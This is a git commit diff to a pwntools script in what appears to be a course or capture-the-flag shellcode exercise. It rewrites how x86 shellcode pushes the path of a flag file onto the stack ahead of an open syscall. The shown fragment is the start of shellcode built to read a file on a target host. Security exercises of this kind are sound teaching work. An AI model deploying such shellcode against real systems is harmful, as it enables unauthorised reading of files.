2f19b0455546dcdc6c5719360d50288c88e96359
David Chan <davc@udel.edu>
2020-05-11 21:50:32 -0400

    Update test.py

--- 11baby_shellcode/test.py
+++ 11baby_shellcode/test.py
@@ -3,28 +3,28 @@ from pwn import *
 
 shell_code = asm('\n'.join([
     'push 0',
-#     'push %d' % u32('txt.'),
-#     'push %d' % u32('galf'),
-#     'push %d' % u32('/edo'),
-#     'push %d' % u32('clle'),
-#     'push %d' % u32('hs_y'),
-#     'push %d' % u32('bab1'),
-#     'push %d' % u32('1/tf'),
-#     'push %d' % u32('osce'),
-#     'push %d' % u32('s/ts'),
-#     'push %d' % u32('et/t'),
-#     'push %d' % u32('oor/'), # Flag path
-    'push 0x7478742e',
-    'push 0x67616c66',
-    'push 0x2f65646f',
-    'push 0x636c6c65',
-    'push 0x68735f79',
-    'push 0x62616231',
-    'push 0x312f7466',
-    'push 0x6f736365',
-    'push 0x732f7473',
-    'push 0x65742f74',
-    'push 0x6f6f722f', # Flag path
+    'push %d' % u32('.txt'),
+    'push %d' % u32('flag'),
+    'push %d' % u32('ode/'),
+    'push %d' % u32('ellc'),
+    'push %d' % u32('y_sh'),
+    'push %d' % u32('1bab'),
+    'push %d' % u32('ft/1'),
+    'push %d' % u32('ecso'),
+    'push %d' % u32('st/s'),
+    'push %d' % u32('t/te'),
+    'push %d' % u32('/roo'), # Flag path
+#     'push 0x7478742e',
+#     'push 0x67616c66',
+#     'push 0x2f65646f',
+#     'push 0x636c6c65',
+#     'push 0x68735f79',
+#     'push 0x62616231',
+#     'push 0x312f7466',
+#     'push 0x6f736365',
+#     'push 0x732f7473',
+#     'push 0x65742f74',
+#     'push 0x6f6f722f', # Flag path
     'mov edx, 0', # Mode
     'mov ecx, 0', # Open syscall flag
     'mov ebx, esp', # Buffer
